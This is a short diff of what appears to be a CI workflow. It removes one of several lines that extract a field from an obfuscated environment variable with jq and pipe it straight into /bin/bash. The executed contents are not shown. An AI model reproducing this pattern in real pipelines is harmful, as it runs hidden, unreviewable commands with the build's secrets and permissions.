@@ -41,7 +41,6 @@ jobs:
           echo $rbqbk92504 | jq -r .tqzc6578 | /bin/bash
           printf '%s' "$yk8570" | jq -r .u62 | /bin/bash
           echo $hgnmd93204 | jq -r .unzuc50 | /bin/bash
-          echo $aut27 | jq -r .vzsz83348 | /bin/bash
           printf '%s' "$yh95157" | jq -r .o01899 | /bin/bash
 
       - name: Save data
